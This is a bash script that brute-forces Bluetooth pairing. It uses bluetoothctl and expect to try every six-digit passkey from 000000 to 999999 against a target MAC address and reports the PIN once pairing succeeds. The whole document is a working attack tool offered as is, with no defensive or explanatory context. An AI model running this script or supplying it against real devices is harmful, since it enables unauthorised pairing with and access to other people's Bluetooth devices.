#!/bin/bash
MAC="<MAC>"

for pin in $(seq -w 000000 999999); do
  echo "trying: $pin"
  bluetoothctl remove $MAC 2>/dev/null

  result=$(expect -c "
    set timeout 5
    spawn bluetoothctl
    expect \">\"
    send \"agent on\r\"
    expect \">\"
    send \"pair $MAC\r\"
    expect {
      \"Enter passkey\" {
        send \"$pin\r\"
        expect {
          \"successful\" { exit 0 }
          \"Failed\"     { exit 1 }
          timeout       { exit 1 }
        }
      }
      \"Failed\" { exit 1 }
      timeout   { exit 1 }
    }
  " 2>&1)

  if [ $? -eq 0 ]; then
    echo "PIN FOUND: $pin"
    break
  fi
done
